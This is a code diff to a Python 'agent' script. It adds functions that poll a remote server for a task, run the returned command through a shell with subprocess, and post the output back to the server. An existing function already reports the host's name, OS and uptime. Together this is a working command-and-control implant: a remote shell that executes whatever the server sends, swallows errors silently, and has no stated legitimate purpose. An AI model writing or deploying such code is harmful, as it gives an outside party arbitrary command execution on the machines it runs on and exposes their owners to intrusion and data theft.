@@ -25,10 +25,29 @@ def get_uptime():
     return f"{uptime_minutes:.2f}"
 
 def get_task():
-    resp = requests.get(SERVER_URL + "/task/"+AGENT_ID, headers=headers)
+    try:
+        resp = requests.get(SERVER_URL + "/task/"+AGENT_ID, headers=headers)
 
-    if resp.status_code == 200:
-        print(resp.json())
+        if resp.status_code == 200:
+            data = resp.json()["task"]["command"]
+            send_msg(execute(data))
+    except:
+        print("lost connection")
+
+def execute(comm):
+    try:
+        result = subprocess.check_output(comm, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
+        return result
+    except:
+        pass
+
+def send_msg(result):
+    try:
+        resp=requests.post(SERVER_URL + "/get_result/"+AGENT_ID, json={"result":result}, headers=headers)
+        if resp.status_code == 200:
+            print(f"send success {result}")
+    except:
+        pass
 
 def status(): 
     payload = {"agent_id": AGENT_ID, "hostname":platform.node(),"uptime":get_uptime(), "os":platform.system() }
